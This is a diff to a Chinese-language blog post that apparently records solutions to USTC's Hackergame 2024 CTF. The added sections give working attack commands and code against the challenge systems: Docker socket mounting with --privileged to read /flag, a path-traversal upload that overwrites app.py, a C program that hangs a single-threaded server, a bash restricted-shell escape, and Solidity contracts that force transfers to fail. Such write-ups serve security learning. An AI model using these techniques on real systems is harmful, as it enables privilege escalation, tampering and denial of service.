@@ -1,6 +1,6 @@
 ---
 author: Kris Hu
-pubDatetime: 2024-11-10T06:50:13.000+08:00
+pubDatetime: 2024-11-10T15:24:29.000+08:00
 modDatetime:
 title: Hackergame 2024 解题记录
 featured: false
@@ -47,7 +47,7 @@ Hackergame 2024 是[中国科学技术大学第十一届信息安全大赛](http
 interfaces of target providers).` (Ma et al., 2024)
 5. 紧跟时事了。https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2
 6. https://belladoreai.github.io/llama3-tokenizer-js/example-demo/build/
-   但是发现不对，尝试+1-1遂过。
+   但是发现不对，尝试 +1 或者 -1 遂过。
 
 ## 打不开的盒
 
@@ -459,3 +459,487 @@ PaddleOCR 确实厉害，一次通过。
 是开了浏览器 Developer Tools 在 Console 里模拟了一下，发现有个 `__proto__` 不知道是什么。
 
 最后听 https://www.youtube.com/watch?v=gCVTbfDecwI 听懂的。
+
+## Docker for Everyone Plus
+
+这道题很好，但是体验不是太好。主要问题是题目环境虚拟机启动太慢，文件上传困难。
+
+### No Enough Privilege
+
+首先发现我们可以 `sudo docker image load`，那么我们肯定是要上传一个镜像上去的。各种奇怪而无效的尝试略，最后使用 iTerm 2 + lrzsz + 神秘脚本。zmodem 又套上 nc 那是双重的慢，自然我们希望这个镜像能小一点，不然加载完镜像已经没时间做题了。
+
+说起小镜像第一印象自然是 `scratch`，白纸一张啥都没有。那么接下来最小可用的很容易想到是 busybox，一搜果然有官方镜像，`busybox:uclibc` 仅 1.23M，我都懒得再 gzip 一下了。
+
+那么我们已经可以 `sudo docker run --rm -u 1000:1000 -it busybox:uclibc` 拿到一个我们有完全控制的 shell 了。
+
+`ls -ln` 看到 `/flag` 在 `0(root)` 组内也是可以读的，接着看被连接的 `/dev/vdb`，同样组内可读，不过组是 `6(disk)`。那么我们的思路就是给容器加上这些组，再让它能读设备。
+
+```sh
+sudo docker run --rm -u 1000:1000 -it --group-add 0 --group-add 6 --privileged -v /flag:/flag busybox:uclibc
+cat /flag
+```
+
+拿到第一个 flag。
+
+### Unbreakable!
+
+看到 `docker run` 被加了这么多限制，我是怒从心头起，直接不用你给我的 `sudo docker run` 了。
+
+其实也很简单，众所周知 `docker` 本质只是一个客户端，其通过 `/var/run/docker.sock` 向 Docker Daemon 交互。那么我的思路就是把这个 .sock 映射进自己的容器里，再用自己（从 host 映射来）的 docker cli 交互。但是 Docker Daemon 就那一个跑在宿主机上，所以相当于得到了完整的 docker cli。
+
+这里只有一个小小的问题，`docker` 在 `busybox:uclibc` 里缺运行库捏。在宿主机上 `ldd` 看一眼，使用的是 musl。那我们干脆就传个 alpine 镜像吧。`gzip -9` 以后大概 3.5M，也能接受。
+
+```sh
+sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 --group-add 103 -it -v /var/run/docker.sock:/var/run/docker.sock:rw -v /usr/bin/docker:/usr/bin/docker alpine
+docker run -it --rm --group-add 0 --group-add 6 --privileged -c /flag:/flag alpine
+cat /flag
+```
+
+## 不太分布式的软总线
+
+又出现了文件上传困难，后面类似需要传二进制的题都有同样情况。
+
+### What DBus Gonna Do?
+
+简单拷打 AI 可以得到一个命令就能解决。
+
+```sh
+#!/bin/sh
+
+dbus-send --print-reply --dest=cn.edu.ustc.lug.hack.FlagService /cn/edu/ustc/lug/hack/FlagService cn.edu.ustc.lug.hack.FlagService.GetFlag1 string:com.pgaur.GDBUS string:"Please give me flag1"
+```
+
+### If I Could Be A File Descriptor
+
+对着题目附件给的 `getflag3.c` 照猫画虎写了一个。可以传一个 pipe 过去。坑点在于接受 fd 居然是在另外的参数，所以要用另外的函数。
+
+```c
+connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
+
+int pipefd[2];
+int fd = pipefd[1];
+
+const char *message = "Please give me flag2\n";
+size_t message_length = strlen(message);
+
+if (write(fd, message, message_length) != message_length) {
+  perror("write failed");
+  close(fd);
+  return EXIT_FAILURE;
+}
+close(fd);
+
+int rfd = pipefd[0];
+
+result = g_dbus_connection_call_with_unix_fd_list_sync(
+    connection, DEST, OBJECT_PATH, INTERFACE, METHOD, g_variant_new("(h)", 0),
+    g_variant_type_new("(s)"), G_DBUS_CALL_FLAGS_NONE, -1,
+    g_unix_fd_list_new_from_array(&rfd, 1), NULL, NULL, &error);
+
+if (result) {
+  gchar *flag;
+  g_variant_get(result, "(&s)", &flag);
+  g_print("%s", flag);
+  g_variant_unref(result);
+} else {
+  g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
+  g_error_free(error);
+}
+```
+
+然后编译也照着给的 `Makefile` 用 pkg-config 。但是问题就是这个编译出来的二进制，传上去不运行！
+
+报的 `file not found`，估摸着是动态链接的问题，那就编译成静态文件吧。首先要对编译命令作出一些修改
+
+```makefile
+flag2: flag2.c
+	gcc -static `pkg-config --static --cflags blkid glib-2.0 gio-2.0` flag2.c -o flag2 `pkg-config --static --libs blkid glib-2.0 gio-2.0`
+```
+
+然后我们写一个 nix package 来创造一个合适的编译环境
+
+```nix
+flag2 = pkgs.stdenv.mkDerivation {
+  pname = "flag2";
+  version = "1.0";
+
+  src = ./src;
+
+  buildInputs =
+    (with pkgs.pkgsStatic; [
+      glib
+      pcre2
+      libselinux
+      libsepol
+    ])
+    ++ (with pkgs; [
+      musl
+      util-linux
+
+      gcc13
+      gnumake
+      pkg-config
+    ]);
+
+  nativeBuildInputs = with pkgs; [ gcc13 ];
+
+  buildPhase = ''
+    make clean
+    make flag2
+  '';
+
+  installPhase = ''
+    mkdir -p $out
+    cp flag2 $out
+  '';
+};
+```
+
+`nix build .#flag2` 后上传 `./result/flag2` 即可。
+
+### Comm Say Maybe
+
+拷打 AI 得知可以通过 prctl 改自己的 `/proc/self/comm`。然后还给了个用 GNU D-Bus 的 code，我觉得比题目给的 gio 更可读一点。
+
+```c
+connection = dbus_bus_get(DBUS_BUS_SYSTEM, &error);
+message = dbus_message_new_method_call(DEST, OBJECT_PATH, INTERFACE, METHOD);
+
+const char *payload = "getflag3";
+if (prctl(PR_SET_NAME, (unsigned long)payload, 0, 0, 0) != 0) {
+  perror("prctl");
+  return EXIT_FAILURE;
+}
+
+reply = dbus_connection_send_with_reply_and_block(connection, message, -1,
+                                                  &error);
+
+if (dbus_message_iter_init(reply, &args)) {
+  if (DBUS_TYPE_STRING == dbus_message_iter_get_arg_type(&args)) {
+    dbus_message_iter_get_basic(&args, &result);
+    printf("Received response: %s\n", result);
+  } else {
+    fprintf(stderr, "Unexpected response type\n");
+  }
+} else {
+  fprintf(stderr, "No response arguments\n");
+}
+```
+
+## 禁止内卷
+
+审计源代码发现没有对文件名做任何检查就会直接写入。友善地请 AI 帮我在前端页面写了个 js 函数来自定义文件名。
+
+注意到题面给出的「完整」启动命令中没有给出文件名。从 [Flask 文档](https://flask.palletsprojects.com/en/stable/quickstart/)可以看到有一个自动发现的行为，那么文件名大概率是 `app.py` 或者 `wsgi.py`。
+
+最后上传 `../web/app.py`
+
+```python
+@app.route("/", methods=["GET"])
+def index():
+    with open("answers.json") as f:
+        answers = json.load(f)
+    return json.dumps(answers)
+```
+
+数据处理就很简单了
+
+```python
+"".join(chr(i) for i in data)
+```
+
+## 动画分享
+
+### 只要不停下 （后略）
+
+审计源代码发现这个服务器是单线程的。而 TCP 是有状态的，我们可以建立一个 TCP 连接而不发送任何信息，于是服务器就会被卡死。但是我们需要让提交的程序先行返回才能触发判定 flag 的机制。可以 fork 一个进程出来然后让子进程睡大觉。
+
+```c
+void open_connections() {
+  int sockets[NUM_CONNECTIONS];
+  struct sockaddr_in server_addr;
+  char *server_ip = "127.0.0.1";
+  int port = 8000;
+
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_port = htons(port);
+  if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
+    perror("Invalid address or address not supported");
+    exit(EXIT_FAILURE);
+  }
+
+  for (int i = 0; i < NUM_CONNECTIONS; i++) {
+    sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockets[i] < 0) {
+      perror("Socket creation error");
+      exit(EXIT_FAILURE);
+    }
+
+    if (connect(sockets[i], (struct sockaddr *)&server_addr,
+                sizeof(server_addr)) < 0) {
+      perror("Connection failed");
+      close(sockets[i]);
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  sleep(300);
+}
+
+int main() {
+  pid_t pid = fork();
+
+  if (pid < 0) {
+    perror("Fork failed");
+    return 1;
+  } else if (pid == 0) {
+    open_connections();
+    exit(0);
+  } else {
+    printf("Parent process returning immediately.\n");
+    return 0;
+  }
+}
+```
+
+### 希望的终端 （后略）
+
+没做出来。以为是跟 X Server 有关。
+
+## 关灯
+
+### Easy - Hard
+
+跟二维的关灯没有本质区别，同样可以用线代计算。于是高斯消元的代码都没动。只需要处理一下如何把三维展开到一维。
+
+```python
+def get_index(x: int, y: int, z: int) -> int:
+    return x * n * n + y * n + z
+
+
+def create_matrix():
+    A = np.zeros((n * n * n, n * n * n), dtype=int)
+
+    for i in range(n):
+        for j in range(n):
+            for k in range(n):
+                index = get_index(i, j, k)
+                A[index][index] = 1
+
+                if i + 1 < n:
+                    A[index][get_index(i + 1, j, k)] = 1
+                if i - 1 >= 0:
+                    A[index][get_index(i - 1, j, k)] = 1
+                if j + 1 < n:
+                    A[index][get_index(i, j + 1, k)] = 1
+                if j - 1 >= 0:
+                    A[index][get_index(i, j - 1, k)] = 1
+                if k + 1 < n:
+                    A[index][get_index(i, j, k + 1)] = 1
+                if k - 1 >= 0:
+                    A[index][get_index(i, j, k - 1)] = 1
+
+    return A
+
+def gauss(A, b):
+    n = len(b)
+    for i in range(n):
+        pivot_row = i + np.argmax(A[i:, i])
+        if A[pivot_row, i] == 0:
+            continue
+
+        A[[i, pivot_row]] = A[[pivot_row, i]]
+        b[[i, pivot_row]] = b[[pivot_row, i]]
+
+        for j in range(i + 1, n):
+            if A[j, i] == 1:
+                A[j] ^= A[i]
+                b[j] ^= b[i]
+
+    x = np.zeros(n, dtype=int)
+    for i in range(n - 1, -1, -1):
+        x[i] = b[i]
+        for j in range(i + 1, n):
+            x[i] ^= A[i][j] * x[j]
+
+    return x
+
+b = np.array(initial_state, dtype=int)
+solution = gauss(A, b)
+```
+
+## PowerfulShell
+
+首先我们大致看一下还剩下哪些字符可用：`` `$|[]{}~-_=+:``
+
+看到 `$` 就知道大概是要各种神奇的变量展开了。而且只有 `0` 被禁掉了（不然就太简单了）也是直接印证了我的想法。于是翻 bash 手册去了。最后选出来 `~` = `/players` ，`$-` = `hB`。一看 `s h` 齐全了，想办法拼在一起就好了。
+
+可以看到 bash 有一个写法是 `${parameter:offset:length}` ，不过 `h` 在 offset 0 不能直接写，可以倒过来当成 offset -2 。
+
+```sh
+__=~    #/players
+___=$-  #hB
+${__: -1: 1}${___: -2: 1}
+cat ../flag
+```
+
+## 不宽的宽字符
+
+礼貌询问 AI 得知在 Windows 上 wchar_t 是 UTF16-LE，而且 `std::wstring::c_str()` 给的是个 `wchar_t*`。然后聪明的小 A 帮我们强转成了 `char*`。众所周知一个 `char*` 会结束在 `\0`。那么目标就是构造一个后 8 位为 0 的 UTF16-LE。
+
+先把 `theflag` 转成 ASCII，发现正好是 7 字节：`74 68 65 66 6c 61 67`
+
+那么补一个 00 得到 `74 68 65 66 6c 61 67 00`，按 UTF16-LE 解码即可：`桴晥慬g`。
+
+## 优雅的不等式
+
+### Easy
+
+一开始我看样例里面给的
+
+$$
+f(x) = g(x) + h(x) \\ \text{where} \int_0^1 g(x)=\pi
+$$
+
+形式挺好的，就这么解一下吧。看了一下 `h(x)` 的度太低，不妨先来个 2 推着玩。
+
+$$
+\begin{aligned}
+     h(x) &= a(1-x^2) \\
+    \int_0^1  h(x) &= \int_0^1 a(1-x^2) \\
+        &= a\left[\int_0^1\ 1 - \int_0^1 x^2\right] \\
+        &= \dfrac{2}{3}a
+\end{aligned}
+$$
+
+那么令 $h(x) = 8/3$，得到 $a = 4$。即 $f(x) = 4\sqrt{1-x^2} - 4(1-x^2)$ 。
+
+### Hard
+
+结果我是在这个方向上执迷不悟啊，推了半天都没去管 $g(x)$ 。然后一看，这提交长度限制只有 400，感觉这个方向是错的。那就直接构造 $\int_0^1 f(x) = \pi - p/q$ 吧。
+
+搜到 Lucas ([2009](https://doi.org/10.1080/00029890.2009.11920923)) 近一步拓展了
+
+$$
+I_{m,n}=\int_0^1 \dfrac{x^m(1-x)^n}{1+x^2}=a+b\pi+c\ln{2}
+$$
+
+指出
+
+$$
+I_{m,n}=\int_0^1 \dfrac{x^m(1-x)^n(a+bx+cx^2)}{1+x^2}=a+b\pi+c\ln{2}
+$$
+
+可以看到在有解的情况下，如果 $(a+bx+cx^2) \geq 0, \forall x \in [0,1]$ 则 $\dfrac{x^m(1-x)^n(a+bx+cx^2)}{1+x^2} \geq0, \forall x in [0,1]$
+
+那么我们在想要 $I_{m,n} = \pi - p/q$ 的情况下，只需要求解
+
+$$
+\begin{cases}
+    a=p/q \\
+    b=1 \\
+    c=0
+\end{cases}
+$$
+
+三个方程即可得到 $f(x)$ 了。
+
+接下来的问题是如何选择 $m,n$ 。大力枚举发现 $m,n$ 越大有解的 $\pi - p/q$ 就越小，而且不会影响大的 $\pi - p/q$。最后主要考虑到 400 字符的提交限制，差不多选了一个。
+
+```python
+m = 82
+n = 81
+integrand = x**m * (1 - x) ** n * (a + b * x + c * x**2) / (1 + x**2)
+integral = sp.simplify(sp.integrate(integrand, (x, 0, 1)))
+
+eq1, eq2, eq3 = 0, 0, 0
+
+for term in integral.args:
+    term_dpi = term / sp.pi
+    if term.is_Symbol or (
+        term.is_Mul
+        and len(term.args) == 2
+        and (
+            (term.args[0].is_Symbol and term.args[1].is_Rational)
+            or (term.args[1].is_Symbol and term.args[0].is_Rational)
+        )
+    ):
+        eq1 += term
+    elif term_dpi.is_Symbol or (
+        term_dpi.is_Mul
+        and len(term_dpi.args) == 2
+        and (
+            (term_dpi.args[0].is_Symbol and term_dpi.args[1].is_Rational)
+            or (term_dpi.args[1].is_Symbol and term_dpi.args[0].is_Rational)
+        )
+    ):
+        eq2 += term_dpi
+    else:
+        eq3 += term / sp.log(2)
+
+def compute_integral_and_solve(p: int, q: int) -> str:
+    solution = sp.solve(
+        [eq1 + sp.Rational(p, q), eq2 - 1, eq3],
+        (a, b, c),
+        rational=True,
+        dict=True,
+    )
+    if not len(solution):
+        return
+
+    ra = solution[0][a]
+    rb = solution[0][b]
+    rc = solution[0][c]
+
+    domain = sp.Interval(0, 1)
+    gtz = sp.solveset((ra + rb * x + rc * x**2) >= 0, x, domain) == domain
+
+    if gtz:
+        ans_str = str(sp.simplify(x**m * (1 - x) ** n * (ra + rb * x + rc * x**2) / (1 + x**2)))
+        return ans_str
+```
+
+## 链上转账助手
+
+从来没接触过 Web3 和 Solidity，全靠拷打 AI。
+
+### 转账失败
+
+`batchTransfer` 会通过 `.transfer` 调用我们写的合约中的 `payable` 函数。我们可以选择在这个函数中拒绝这个 transfer。
+
+```solidity
+contract BatchTransfer {
+    fallback() external payable {
+        require(false, "never accept");
+    }
+}
+```
+
+### 转账又失败
+
+Solidity 中每个操作都会消耗一定的 gas，而如果耗尽会直接回滚整个块。
+
+```solidity
+contract BatchTransfer {
+    address sender;
+
+    function stalling1() internal {
+        stalling2();
+    }
+
+    function stalling2() internal {
+        stalling1();
+    }
+
+    receive() external payable {
+        sender = msg.sender;
+        require(msg.value > 0);
+
+        stalling1();
+    }
+}
+```
+
+## LESS 文件查看器在线版
+
+开的最后一道题。其实已经查到 lesspipe 了。但是后来出去逛街了没继续做。
